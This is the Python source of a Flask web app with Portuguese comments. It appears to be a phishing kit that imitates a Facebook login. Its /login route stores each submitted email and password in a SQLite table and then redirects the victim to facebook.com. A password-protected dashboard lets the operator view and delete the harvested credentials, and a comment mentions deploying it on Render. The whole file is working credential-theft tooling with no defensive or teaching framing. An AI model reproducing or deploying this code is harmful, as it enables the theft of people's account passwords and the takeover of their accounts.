from flask import Flask, render_template, request, redirect, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = "segredo_super_secreto"

# Caminho absoluto para o banco de dados
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(BASE_DIR, "database/database.db")

# Função para salvar credenciais
def salvar_credenciais(email, senha):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    data_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO credenciais (email, senha, data_hora) VALUES (?, ?, ?)", (email, senha, data_hora))
    conn.commit()
    conn.close()

# Página inicial
@app.route("/")
def index():
    return render_template("index.html")

# Página de login simulado
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        senha = request.form["senha"]
        salvar_credenciais(email, senha)
        return redirect("https://facebook.com")
    return render_template("login.html")

# Página de login do admin
@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    erro = False
    if request.method == "POST":
        usuario = request.form["usuario"]
        senha = request.form["senha"]
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM admin WHERE usuario=? AND senha=?", (usuario, senha))
        admin = cursor.fetchone()
        conn.close()
        if admin:
            session["admin"] = True
            return redirect("/dashboard")
        else:
            erro = True
    return render_template("admin_login.html", erro=erro)

# Painel administrativo
@app.route("/dashboard")
def dashboard():
    if not session.get("admin"):
        return redirect("/admin")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credenciais ORDER BY data_hora DESC")
    dados = cursor.fetchall()
    conn.close()
    return render_template("dashboard.html", dados=dados)

# Rota para apagar credencial
@app.route("/delete/<int:id>")
def delete_credencial(id):
    if not session.get("admin"):
        return redirect("/admin")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM credenciais WHERE id=?", (id,))
    conn.commit()
    conn.close()
    return redirect("/dashboard")

# Logout do admin
@app.route("/logout")
def logout():
    session.pop("admin", None)
    return redirect("/admin")

# Inicialização compatível com Render
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
